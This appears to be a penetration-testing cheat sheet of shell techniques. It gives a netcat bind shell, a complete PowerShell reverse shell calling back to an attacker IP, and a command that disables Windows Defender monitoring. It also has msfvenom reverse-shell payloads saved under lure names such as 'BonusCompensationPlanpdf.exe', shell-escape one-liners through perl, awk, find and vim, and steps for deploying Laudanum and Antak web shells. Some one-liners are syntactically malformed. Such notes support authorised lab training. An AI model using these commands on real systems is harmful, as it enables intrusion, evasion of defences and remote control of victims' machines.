## **Bind Shells**
With a bind shell, the target system has a listener started and awaits a connection from a pentester's system (attack box).
1. Server - Binding a Bash shell to the TCP session: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f`
2. Connecting to bind shell on target: `nc -nv 10.129.41.200 7777`
## **Reverse Shells**
With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.
1. Server (attack box): `sudo nc -lvnp 443`
2. Client (target): `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
3. If Windows Defeneder stopped comunnication: `Set-MpPreference -DisableRealtimeMonitoring $true`
## **Payloads**
1. Powershell One-liner: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
2. Bash onliner: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f`
### **Crafting Payloads with MSFvenom**
1. List Payloads: `msfvenom -l payloads`
2. Building A Stageless Payload for Linux: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf`
3. Building a simple Stageless Payload for a Windows system: `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe`
### **Spawning Interactive Shells**
1. `/bin/sh -i`
2. Perl To Shell:
    1. `perl —e 'exec "/bin/sh";'`
    2. `perl: exec "/bin/sh";`
3. Ruby To Shell: `ruby: exec "/bin/sh"`
4. Lua To Shell: `lua: os.execute('/bin/sh')`
5. AWK To Shell: `awk 'BEGIN {system("/bin/sh")}'`
6. Using Find For A Shell: `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`
7. Using Exec To Launch A Shell: `find . -exec /bin/sh \; -quit`
8. Vim To Shell: `vim -c ':!/bin/sh'`
### **Execution Permissions Considerations**
Use `sudo -l` to find services you can run as root. Use `ls -la` to check permission.
### **Laudanum, One Webshell to Rule Them All**
1. `cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx`
### **Antak Webshell**
1. `cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx`
2. Modify the Shell for Use (username and password)


